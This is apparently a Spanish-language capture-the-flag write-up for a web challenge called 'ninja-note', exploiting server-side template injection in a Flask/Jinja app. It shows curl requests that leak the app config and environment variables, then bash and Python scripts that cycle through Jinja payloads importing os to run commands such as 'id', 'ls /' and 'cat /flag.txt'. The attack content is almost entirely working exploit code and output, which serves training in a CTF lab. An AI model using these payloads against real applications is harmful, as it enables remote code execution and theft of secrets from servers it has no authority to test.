

- Primero confirmamos que existe un SSTI

```
 ~/Downloads/tmp/uscyber/web/ninja-note 
❯ curl -X POST https://meaehmkb.web.ctf.uscybergames.com/api/submit \
  -H "Content-Type: application/json" \
  -H "User-Agent: NinjaNote 13.37" \
  -d '{"title": "ssti-test", "content": "{{config}}"}'
{"note_id":"2e63f0bc-d368-413f-90c9-f337e6aa10e0"}
 ~/Downloads/tmp/uscyber/web/ninja-note 
❯
```

```
 ~/Downloads/tmp/uscyber/web/ninja-note 
❯ curl https://meaehmkb.web.ctf.uscybergames.com/api/notes/2e63f0bc-d368-413f-90c9-f337e6aa10e0 \
  -H "User-Agent: NinjaNote 13.37"
Note ID: 2e63f0bc-d368-413f-90c9-f337e6aa10e0
Title: ssti-test
Note: &lt;Config {&#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;SECRET_KEY&#39;: None, &#39;SECRET_KEY_FALLBACKS&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;TRUSTED_HOSTS&#39;: None, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_PARTITIONED&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;MAX_FORM_MEMORY_SIZE&#39;: 500000, &#39;MAX_FORM_PARTS&#39;: 1000, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;PROVIDE_AUTOMATIC_OPTIONS&#39;: True}&gt;%                                                                                                                                                                         

```


```
curl -X POST  https://zypjrkib.web.ctf.uscybergames.com/api/submit \
  -H "Content-Type: application/json" \
  -H "User-Agent: NinjaNote 13.37" \
  -d '{"title": "env", "content": "{{cycler.__init__.__globals__.os.environ}}"}'
 
{"note_id":"1f727613-dccf-4e03-a9f4-e95e6ba9c8ab"}


	curl https://zypjrkib.web.ctf.uscybergames.com/api/notes/1f727613-dccf-4e03-a9f4-e95e6ba9c8ab \
	  -H "User-Agent: NinjaNote 13.37"



Note ID: 1f727613-dccf-4e03-a9f4-e95e6ba9c8ab
Title: env
Note: environ({&#39;PATH&#39;: &#39;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#39;, &#39;HOSTNAME&#39;: &#39;d157cf1ed995&#39;, &#39;FQDN&#39;: &#39;zypjrkib.web.ctf.uscybergames.com&#39;, &#39;GPG_KEY&#39;: &#39;7169605F62C751356D054A26A821E680E5FA6305&#39;, &#39;PYTHON_VERSION&#39;: &#39;3.13.3&#39;, &#39;PYTHON_SHA256&#39;: &#39;40f868bcbdeb8149a3149580bb9bfd407b3321cd48f0be631af955ac92c0e041&#39;, &#39;HOME&#39;: &#39;/root&#39;, &#39;SERVER_SOFTWARE&#39;: &#39;gunicorn/23.0.0&#39;})%
```


Al final

```bash
#!/bin/bash

BASE_URL="https://hwzufvap.web.ctf.uscybergames.com"
USER_AGENT="NinjaNote 13.37"

payloads=(
"{{config}}"
 "{{ 7 / 0 }}"
 "{{ request.application.__globals__.__builtins__.__import__('os') }}"
 "{{ request.application.__globals__.__builtins__.__import__('os').system('id') }}"
 "{{ request.application.__globals__.__builtins__.__import__('os').popen('ls /').read() }}"
 "{{ request.application.__globals__.__builtins__.__import__('sys').version }}"
 "{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}"
)

for payload in "${payloads[@]}"; do
  echo "[*] Probando payload: $payload"

  res=$(curl -s -X POST "$BASE_URL/api/submit" \
    -H "Content-Type: application/json" \
    -H "User-Agent: $USER_AGENT" \
    -d "{\"title\": \"auto\", \"content\": \"$payload\"}")

  note_id=$(echo "$res" | sed -n 's/.*"note_id"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')

  if [[ -n "$note_id" ]]; then
    sleep 1
    note=$(curl -s "$BASE_URL/api/notes/$note_id" -H "User-Agent: $USER_AGENT")
    echo "[+] Resultado:"
    echo "$note"

    flag=$(echo "$note" | grep -o '[A-Z0-9]\{5\}{[^}]*}')
    if [[ -n "$flag" ]]; then
      echo "[✅] ¡FLAG ENCONTRADA!: $flag"
      break
    fi
  else
    echo "[!] No se pudo obtener note_id"
  fi

  echo ""
done

```

- version python
```python
import requests
import time
import re

BASE_URL = "https://gydaccva.web.ctf.uscybergames.com"
USER_AGENT = "NinjaNote 13.37"

headers = {
    "Content-Type": "application/json",
    "User-Agent": USER_AGENT
}

payloads = [
    "{{config}}",
    "{{ 7 / 0 }}",
    "{{ request.application.__globals__.__builtins__.__import__('os') }}",
    "{{ request.application.__globals__.__builtins__.__import__('os').system('id') }}",
    "{{ request.application.__globals__.__builtins__.__import__('os').popen('ls /').read() }}",
    "{{ request.application.__globals__.__builtins__.__import__('sys').version }}",
    "{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}"
]

for payload in payloads:
    print(f"[*] Probando payload: {payload}")
    
    data = {
        "title": "auto",
        "content": payload
    }

    try:
        res = requests.post(f"{BASE_URL}/api/submit", headers=headers, json=data)
        res_json = res.json()
        note_id = res_json.get("note_id")

        if note_id:
            time.sleep(1)
            note_res = requests.get(f"{BASE_URL}/api/notes/{note_id}", headers={"User-Agent": USER_AGENT})
            note_text = note_res.text
            print("[+] Resultado:")
            print(note_text)

            match = re.search(r"[A-Z0-9]{5}{[^}]*}", note_text)
            if match:
                print(f"[✅] ¡FLAG ENCONTRADA!: {match.group(0)}")
                break
        else:
            print("[!] No se pudo obtener note_id")
    except Exception as e:
        print(f"[!] Error: {e}")

    print()

```


